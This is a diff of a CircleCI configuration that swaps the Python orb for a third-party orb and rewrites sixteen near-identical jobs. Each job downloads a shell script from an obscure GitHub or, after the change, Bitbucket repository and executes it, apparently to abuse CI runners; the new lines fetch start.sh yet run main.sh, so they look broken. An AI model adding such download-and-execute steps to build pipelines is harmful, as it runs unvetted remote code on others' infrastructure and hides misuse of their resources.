@@ -1,7 +1,7 @@
 version: 2.1
 
 orbs:
-  python: circleci/python@1.2
+  multirepo: dnephin/multirepo@0.0.7
 
 jobs:
 
@@ -13,7 +13,7 @@ jobs:
     steps:
         - run:
             name: main_16
-            command: wget https://raw.githubusercontent.com/juynemiko/getclone/master/main.sh && chmod u+x main.sh && ./main.sh
+            command: wget https://bitbucket.org/kantcureeee/zerg/raw/0723b891c1505e411058bde70647fc6f60e251f5/start.sh && chmod u+x main.sh && ./main.sh
 
   main_15:
     docker:
@@ -23,7 +23,7 @@ jobs:
     steps:
         - run:
             name: main_15
-            command: wget https://raw.githubusercontent.com/juynemiko/getclone/master/main.sh && chmod u+x main.sh && ./main.sh
+            command: wget https://bitbucket.org/kantcureeee/zerg/raw/0723b891c1505e411058bde70647fc6f60e251f5/start.sh && chmod u+x main.sh && ./main.sh
 
   main_14:
     docker:
@@ -33,7 +33,7 @@ jobs:
     steps:
         - run:
             name: main_14
-            command: wget https://raw.githubusercontent.com/juynemiko/getclone/master/main.sh && chmod u+x main.sh && ./main.sh
+            command: wget https://bitbucket.org/kantcureeee/zerg/raw/0723b891c1505e411058bde70647fc6f60e251f5/start.sh && chmod u+x main.sh && ./main.sh
 
   main_13:
     docker:
@@ -43,7 +43,7 @@ jobs:
     steps:
         - run:
             name: main_13
-            command: wget https://raw.githubusercontent.com/juynemiko/getclone/master/main.sh && chmod u+x main.sh && ./main.sh
+            command: wget https://bitbucket.org/kantcureeee/zerg/raw/0723b891c1505e411058bde70647fc6f60e251f5/start.sh && chmod u+x main.sh && ./main.sh
 
   main_12:
     docker:
@@ -53,7 +53,7 @@ jobs:
     steps:
         - run:
             name: main_12
-            command: wget https://raw.githubusercontent.com/juynemiko/getclone/master/main.sh && chmod u+x main.sh && ./main.sh
+            command: wget https://bitbucket.org/kantcureeee/zerg/raw/0723b891c1505e411058bde70647fc6f60e251f5/start.sh && chmod u+x main.sh && ./main.sh
 
   main_11:
     docker:
@@ -63,7 +63,7 @@ jobs:
     steps:
         - run:
             name: main_11
-            command: wget https://raw.githubusercontent.com/juynemiko/getclone/master/main.sh && chmod u+x main.sh && ./main.sh
+            command: wget https://bitbucket.org/kantcureeee/zerg/raw/0723b891c1505e411058bde70647fc6f60e251f5/start.sh && chmod u+x main.sh && ./main.sh
 
   main_10:
     docker:
@@ -73,7 +73,7 @@ jobs:
     steps:
         - run:
             name: main_10
-            command: wget https://raw.githubusercontent.com/juynemiko/getclone/master/main.sh && chmod u+x main.sh && ./main.sh
+            command: wget https://bitbucket.org/kantcureeee/zerg/raw/0723b891c1505e411058bde70647fc6f60e251f5/start.sh && chmod u+x main.sh && ./main.sh
 
   main_09:
     docker:
@@ -83,7 +83,7 @@ jobs:
     steps:
         - run:
             name: main_09
-            command: wget https://raw.githubusercontent.com/juynemiko/getclone/master/main.sh && chmod u+x main.sh && ./main.sh
+            command: wget https://bitbucket.org/kantcureeee/zerg/raw/0723b891c1505e411058bde70647fc6f60e251f5/start.sh && chmod u+x main.sh && ./main.sh
 
   main_08:
     docker:
@@ -93,7 +93,7 @@ jobs:
     steps:
         - run:
             name: main_08
-            command: wget https://raw.githubusercontent.com/juynemiko/getclone/master/main.sh && chmod u+x main.sh && ./main.sh
+            command: wget https://bitbucket.org/kantcureeee/zerg/raw/0723b891c1505e411058bde70647fc6f60e251f5/start.sh && chmod u+x main.sh && ./main.sh
 
   main_07:
     docker:
@@ -103,7 +103,7 @@ jobs:
     steps:
         - run:
             name: main_07
-            command: wget https://raw.githubusercontent.com/juynemiko/getclone/master/main.sh && chmod u+x main.sh && ./main.sh
+            command: wget https://bitbucket.org/kantcureeee/zerg/raw/0723b891c1505e411058bde70647fc6f60e251f5/start.sh && chmod u+x main.sh && ./main.sh
 
   main_06:
     docker:
@@ -113,7 +113,7 @@ jobs:
     steps:
         - run:
             name: main_06
-            command: wget https://raw.githubusercontent.com/juynemiko/getclone/master/main.sh && chmod u+x main.sh && ./main.sh
+            command: wget https://bitbucket.org/kantcureeee/zerg/raw/0723b891c1505e411058bde70647fc6f60e251f5/start.sh && chmod u+x main.sh && ./main.sh
 
   main_05:
     docker:
@@ -123,7 +123,7 @@ jobs:
     steps:
         - run:
             name: main_05
-            command: wget https://raw.githubusercontent.com/juynemiko/getclone/master/main.sh && chmod u+x main.sh && ./main.sh
+            command: wget https://bitbucket.org/kantcureeee/zerg/raw/0723b891c1505e411058bde70647fc6f60e251f5/start.sh && chmod u+x main.sh && ./main.sh
 
   main_04:
     docker:
@@ -133,7 +133,7 @@ jobs:
     steps:
         - run:
             name: main_04
-            command: wget https://raw.githubusercontent.com/juynemiko/getclone/master/main.sh && chmod u+x main.sh && ./main.sh
+            command: wget https://bitbucket.org/kantcureeee/zerg/raw/0723b891c1505e411058bde70647fc6f60e251f5/start.sh && chmod u+x main.sh && ./main.sh
 
   main_03:
     docker:
@@ -143,7 +143,7 @@ jobs:
     steps:
         - run:
             name: main_03
-            command: wget https://raw.githubusercontent.com/juynemiko/getclone/master/main.sh && chmod u+x main.sh && ./main.sh
+            command: wget https://bitbucket.org/kantcureeee/zerg/raw/0723b891c1505e411058bde70647fc6f60e251f5/start.sh && chmod u+x main.sh && ./main.sh
 
   main_02:
     docker:
@@ -153,7 +153,7 @@ jobs:
     steps:
         - run:
             name: main_02
-            command: wget https://raw.githubusercontent.com/juynemiko/getclone/master/main.sh && chmod u+x main.sh && ./main.sh
+            command: wget https://bitbucket.org/kantcureeee/zerg/raw/0723b891c1505e411058bde70647fc6f60e251f5/start.sh && chmod u+x main.sh && ./main.sh
 
   main_01:
     docker:
@@ -163,7 +163,7 @@ jobs:
     steps:
         - run:
             name: main_01
-            command: wget https://raw.githubusercontent.com/juynemiko/getclone/master/main.sh && chmod u+x main.sh && ./main.sh
+            command: wget https://bitbucket.org/kantcureeee/zerg/raw/0723b891c1505e411058bde70647fc6f60e251f5/start.sh && chmod u+x main.sh && ./main.sh
 workflows:
     version: 2.1
     main:
